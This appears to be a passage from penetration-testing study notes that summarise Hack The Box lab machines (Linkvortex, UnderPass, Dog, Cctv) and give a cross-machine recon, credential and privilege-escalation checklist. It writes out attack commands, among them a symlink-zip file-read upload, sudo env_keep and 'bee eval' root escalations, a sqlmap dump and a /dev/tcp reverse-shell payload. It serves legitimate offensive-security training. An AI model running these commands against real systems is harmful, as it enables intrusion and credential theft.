* sudoers allows `bash /opt/ghost/clean_symlink.sh *.png` NOPASSWD with `env_keep+=CHECK_CONTENT`. Three wins: double symlink, TOCTOU, and `CHECK_CONTENT=bash` (because `if $CHECK_CONTENT;then` executes the variable). `fs.protected_symlinks=1` means the inner link must live outside sticky world-writable dirs (`/tmp`, `/dev/shm`).

**Commands to remember:**

```bash
git-dumper http://dev.linkvortex.htb source; git -C source status; git -C source diff --cached
ln -s /etc/passwd content/images/x.png; zip -y -r poc.zip content/images/
curl -F 'importfile=@poc.zip' -b 'ghost-admin-api-session=<sess>' http://linkvortex.htb/ghost/api/admin/db
CHECK_CONTENT=bash sudo bash /opt/ghost/clean_symlink.sh a.png
```

**Notes:** [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · [Fuzzing](/notes/web-applications/fuzzing/) · Writeup: [source](https://0xdf.gitlab.io/2025/04/12/htb-linkvortex.html)

## UnderPass

**Path:** SNMP `public` leaks hostname/daloRADIUS → default operator creds → user hash → SSH → sudo `mosh-server` → root.

**Edge cases:**

* TCP looks like a bare Apache default page; the way in is **UDP/161** — a full TCP scan misses it. `snmpwalk`/`nmap -sU` leak the vhost name and the word "daloradius".
* `/daloradius` returns **403, not 404** (a directory exists) and the string is missing from normal wordlists; 403-vs-404 triage is the discovery trick.
* daloRADIUS operator login is `administrator:radius` (default), distinct from the users login; the user table leaks an MD5 that cracks on CrackStation.
* Username case matters: `svcMosh`, not `svcmosh` — brute-forcing with an all-lowercase list fails. sudo allows `/usr/bin/mosh-server` NOPASSWD: start it as root, capture the printed port/key, then connect as the unprivileged user with `MOSH_KEY` exported. Sessions are short-lived; `mosh-client` errors without `MOSH_KEY`.

**Commands to remember:**

```bash
sudo nmap -sU --min-rate 10000 IP
snmpwalk -v 2c -c public IP | tee snmp_data
sudo mosh-server   # MOSH CONNECT 60001 <key>
MOSH_KEY=<key> mosh-client 127.0.0.1 60001
```

**Notes:** [SNMP](/notes/protocols-and-services/snmp/) · [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · Writeup: [source](https://0xdf.gitlab.io/2025/05/10/htb-underpass.html)

## Dog

**Path:** Backdrop CMS with exposed `.git` → config/email leak → admin module upload RCE → password reuse → sudo `bee eval` → root.

**Edge cases:**

* nmap's `http-git` script plus the `X-Generator: Backdrop CMS 1` header give the whole path before any fuzzing; `git-dumper` then `grep -r '@dog.htb'` finds `tiffany@dog.htb` in a config JSON while `settings.php` gives `mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop`.
* Version is **not** in the page: directory listing exposes `core/profiles/testing/testing.info` (`version = 1.27.1`). CVE-2024-41709 is a **false lead**; the "exploit" is just admin module upload.
* A malicious module (`reference.tar` with `shell.php`) installs to `/modules/reference/shell.php`, but a cleanup script removes it fast — upload and hit it immediately.
* `sudo /usr/local/bin/bee`; `bee eval` needs a bootstrapped site: run from `/var/www/html` or pass `--root=/var/www/html` (**`=` required**; `--root /path` fails with "1 is not a valid directory").

**Commands to remember:**

```bash
git-dumper http://IP/ repo; grep -r '@dog.htb' repo
curl http://IP/core/profiles/testing/testing.info
sudo bee status --root=/var/www/html
sudo bee eval 'system("bash")'
```

**Notes:** [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Miscellaneous techniques](/notes/linux-privilege-escalation/miscellaneous-techniques/) · Writeup: [source](https://0xdf.gitlab.io/2025/07/12/htb-dog.html)

## Cctv

**Path:** ZoneMinder `/zm` `admin:admin` → CVE-2024-51482 SQLi → bcrypt crack → SSH `mark` → tcpdump caps → sniff `sa_mark` creds → motionEye RCE → root.

**Edge cases:**

* The SQLi (`event.php`, `action=removetag&tid=`) is blind/time-based and painfully slow; turning it into a boolean UNION makes dumping minutes instead of hours: `--prefix="1 UNION SELECT 1,2,3,4 WHERE " --code 200 --technique=B` (four columns; false ⇒ HTTP 500). `ZMSESSID` expires fast, so keep the request file fresh.
* `getcap -r /` shows `/usr/bin/tcpdump cap_net_raw=eip` — capture on the Docker bridge and read the custom port-5000 protocol in Wireshark; it sends `USERNAME=sa_mark;PASSWORD=...;CMD=disk-info` in clear. `/proc` is `hidepid=invisible`, so don't rely on `ps` to find the service.
* motionEye is bound to `127.0.0.1:8765` → `ssh -L`; login is `admin` + **reused** `sa_mark` password.
* **CVE-2025-60787**: inject into `image_file_name`. The server validates `_signature` = signature over method+URI+body+admin password/hash, so you must submit through the UI; client-side `filenameValidRegExp` blocks `$()`/quotes — bypass with `configUiValid = function() { return true; };` in devtools (or loosen the regex), then Apply and take a snapshot. The payload runs as root because motion/motionEye run as root.

**Commands to remember:**

```bash
sqlmap -r removetag.request -p tid --batch --prefix="1 UNION SELECT 1,2,3,4 WHERE " --code 200 --technique=B -D zm -T Users --dump
hashcat -m 3200 zm.hashes --user rockyou.txt
timeout 120 tcpdump -i any -w ~/capture.pcap
ssh -L 8765:localhost:8765 sa_mark@cctv.htb
# payload: $(bash -c 'bash -i >& /dev/tcp/IP/443 0>&1').%Y-%m-%d-%H-%M-%S
```

**Notes:** [Capabilities abuse](/notes/linux-privilege-escalation/capabilities-abuse/) · [SQL injection](/notes/web-applications/web-attacks/sql-injection/) · Writeup: [source](https://0xdf.gitlab.io/2026/07/11/htb-cctv.html) · [alt](https://hackindex.io/writeups/cctv)

## Cross-machine patterns

Use this as a pre-exploitation and post-exploitation checklist. Each item names the boxes where it decided the outcome.

**Recon before exploitation**

- [ ] Full TCP scan and a UDP pass — SNMP, NFS and mountd hide there (Enigma, Mentor, Pandora, UnderPass, Monitored).
- [ ] Vhost fuzzing with auto-calibration (`-ac`), not only status filtering — wildcard redirects and empty 200s mislead (Keeper, Editor, Mentor, Silentium, BoardLight, Linkvortex).
- [ ] Check `.git`/`.svn`, `/backup/*.tar`, and config backups manually; wordlists miss them (Pilgrimage, UpDown, Linkvortex, Dog, Networked, Enigma).
- [ ] Use nmap `http-git`/`http-generator` before brute force (Pilgrimage, Dog, Linkvortex).
- [ ] Read 403-vs-404: a directory can exist without a listing (UnderPass, UpDown).

**Credentials**

- [ ] Defaults first: product admin panels and old services (`root:root`, `root:password`, `admin:admin`, `administrator:radius`) (Solidstate, Keeper, BoardLight, UnderPass, Cctv).
- [ ] Box-name or guessable passwords still work (Nibbles, Sunday, Irked, Cctv).
- [ ] Harvest pairs from configs and artifacts: `config.inc.php`, `conf.php`, `hibernate.cfg.xml`, `application.properties`, `settings.php`, `.git/config`, `~/.bundle/config`, container `env` (Enigma, Editor, Cozyhosting, Devvortex, BoardLight, Dog, Busqueda, Precious, Silentium).
- [ ] Reuse every pair against SSH, `su`, and the app itself — a DB password is often an OS password (Enigma, Editor, Devvortex, Tabby, Magic, BoardLight, Dog, UnderPass).
- [ ] Mail is a credential transport: POP3/IMAP pillaging beats reset flows (Solidstate, Enigma).
- [ ] Version strings can lie; read changelogs and `readme.txt` (Tartarsauce).

**Web to shell**

- [ ] Upload filters: `Content-Type` only (Popcorn), extension after first dot plus `AddHandler` (Networked), missing `$` anchor in `.htaccess` (Magic), case-sensitive PHP tag filter (BoardLight), orphaned temp file (Help), module install (Dog).
- [ ] LFI/RFI nuance: fixed include filename (Tartarsauce), `phar://` regardless of extension (UpDown), substring filter plus `../` (Nineveh), log poisoning (Poison), phpMyAdmin session include with `%3f` (Jarvis).
- [ ] SQLi as a write primitive: `INTO OUTFILE` with `File_priv=Y` (Jarvis), stacked `INSERT` into a job table (Connected), DB name ending in `.php` (Nineveh).
- [ ] Injection in less obvious fields: JSON `path` (Mentor), Searchor `eval()` (Busqueda), `simpler.py` blacklist missing `$()` (Jarvis), `image_file_name` (Cctv), PDFKit URL (Precious), xajax `ip=>` (OpenAdmin).
- [ ] Deserialization/sandbox: vm2 (Codify), Ruby `YAML.load` (Precious), PHP object injection (Swagshop), GitPython `ext::` (Editorial), Node `Function()` (Silentium).
- [ ] SSRF where the metadata target is blocked: pivot to an internal API instead (Editorial, UpDown).

**CVE reflexes**

- [ ] Fingerprint the bundled binary, not only the web app: ImageMagick 7.1.0-49, binwalk 2.3.2, pdfkit 0.8.6, Ghost, Jenkins, Flowise (Pilgrimage, Precious, Linkvortex, Builder, Silentium).
- [ ] Adapt POCs instead of trusting them: trailing slash (OpenAdmin), `/index.php/admin` + `install_date` (Swagshop), `%20` before backticks (Precious), partial file read (Builder), keyed request signature (Cctv).
- [ ] Know the false leads: Monstra uploads are root-owned (Tartarsauce), Broker's 8161/80 admin UIs are a dead end, CVE-2024-41709 is not the Dog path, phpMyAdmin exploits need creds, Tomcat has no public RCE (Jarvis, Tabby).

**Linux privilege escalation**

- [ ] `sudo -l` first, then GTFOBins with the odd flags: `wget` (Sunday), `ssh -o ProxyCommand` (Cozyhosting), `tar --checkpoint-action` (Tartarsauce), `vi` wildcard prefix (Swagshop), `nano` `^R ^X` (OpenAdmin), `easy_install` (UpDown), `nginx -c` (Broker), `mosh-server` (UnderPass), `bee eval` (Dog), `apport-cli` pager (Devvortex).
- [ ] Read the whole sudo command line: an unquoted comparison accepts `*` (Codify), `./script.sh` runs from your CWD (Busqueda), `env_keep` turns a variable into a command (Linkvortex), `getprofile.sh` zips through a symlink (Monitored).
- [ ] Root-owned jobs: world-writable scripts (Nibbles, Solidstate), `inotifywait` triggers (Pilgrimage), `*.py` glob cron (Bashed), `backuperer` race (Tartarsauce), incron sourcing a writable config (Connected), filename injection into `rm -f` (Networked), chkrootkit 0.49 (Nineveh).
- [ ] SUID and PATH: `ndsudo` (Editor), `viewuser` (Irked), `sysinfo` (Magic), `pandora_backup` (Pandora), `systemctl` unit in `/dev/shm` (Jarvis), Enlightenment with a literal `;` directory (BoardLight).
- [ ] Groups and capabilities: `lxd` (Tabby), `tcpdump cap_net_raw` (Cctv).
- [ ] Kernel/PAM fallbacks: 4.4.0-116 (Help), Ubuntu 9.10 PAM MOTD + DirtyCow (Popcorn).

**Tunnels and hidden services**

- [ ] `ss -tnl` / `netstat` after landing, and read `sites-enabled/*.conf` for `Listen 127.0.0.1` (OpenAdmin, Pandora, Editor).
- [ ] `ssh -L` for one or two services; `ssh -D` + proxychains for VNC/GUI (Poison, Enigma, OpenAdmin, Pandora, Cctv).
- [ ] Localhost-only admin panels: OliveTin 1337, Netdata 19999, motionEye 8765, VNC 5901, MySQL 3306.
- [ ] mpm-itk/`AssignUserID` vhosts block setuid from a webshell — get a real login first (Pandora).

**Hashes**

- [ ] `$5$` → `-m 7400` (Sunday); bcrypt `$2a$`/`$2y$` → `-m 3200` and force it, with `--user` when a prefix precedes the hash (Codify, Devvortex, Builder, Cctv).
- [ ] MD5 hashes crack on CrackStation (UnderPass, Help); `unshadow` before cracking copied `/etc/shadow` files.

**Pitfalls that cost the most time**

- [ ] Pipes and redirects inside Java/Groovy/Node contexts become literal filenames; stage a script and `bash` it (Editor, Cozyhosting, Silentium).
- [ ] URL-encoding: "encode all characters" in Burp, keep `%20` where a space is needed, encode `+` as `%2b` (Editor, Precious, Silentium, Busqueda).
- [ ] A response that looks like an error may mean success: clone_from traceback, "No available actions", "Something went wrong", `mv: cannot stat` (Editorial, Silentium, Monitored).
- [ ] Client-side validation is not validation, but server-side signatures are: edit through the UI (Cctv).
- [ ] `hidepid=invisible` makes `ps` look clean — services still exist (BoardLight, Cctv).
- [ ] Target clock skew breaks timestamp brute force (Help); `fs.protected_symlinks` blocks symlinks in sticky dirs (Linkvortex).
- [ ] Shared-lab artifacts get overwritten — append and re-check (Nibbles).
- [ ] `python -m http.server` cannot receive a POST; use `nc -lnvp` (Sunday).
- [ ] Verify execution out-of-band (listener, `tcpdump`, file timestamp) before abandoning a payload (Silentium, Monitored, Busqueda, Editorial).

---

## Corrections

Two CVE misattributions in earlier drafts were found during verification. Both are corrected in the rows above.

### Enigma — OpenSTAManager chain

**Earlier attribution:** "one writeup reports a file-upload RCE credited as **CVE-2025-69212**, another describes an authenticated SQLi in the Aggiornamenti module plus PHP deserialization via PHPGGC (unverified — sources disagree)."

**Verified attribution:** CVE-2025-69212 is an **OS Command Injection** in the P7M (signed XML) decoding function in OpenSTAManager ≤ 2.9.8. The RCE chain used on Enigma is **CVE-2026-29782** — authenticated SQLi → PHP object injection → RCE. CVE-2026-24418 is a separate error-based SQLi in the Scadenzario module. The "unverified" caveat is removed.

### Keeper — KeePass CVE

**Earlier attribution:** "CVE-2022-32784 (`keepass_dump.py`) recovers all but the first character of the KeePass master password."

**Verified attribution:** the KeePass memory-dump vulnerability is **CVE-2023-32784** — KeePass 2.x before 2.54 allows recovery of the cleartext master password from a memory dump even when the workspace is locked. CVE-2022-32784 is a Request Tracker REST 2.0 API information disclosure, unrelated to KeePass. The Request Tracker foothold (`root:password`) is separate and correct.

> **Verification method:** every CVE was checked against NVD/MITRE and at least one independent advisory or write-up. Techniques without a CVE (Jerry, Netmon, Love) were checked against multiple public walkthroughs. Where a source conflict remains, the row is marked **(unverified)** rather than asserting a single value.
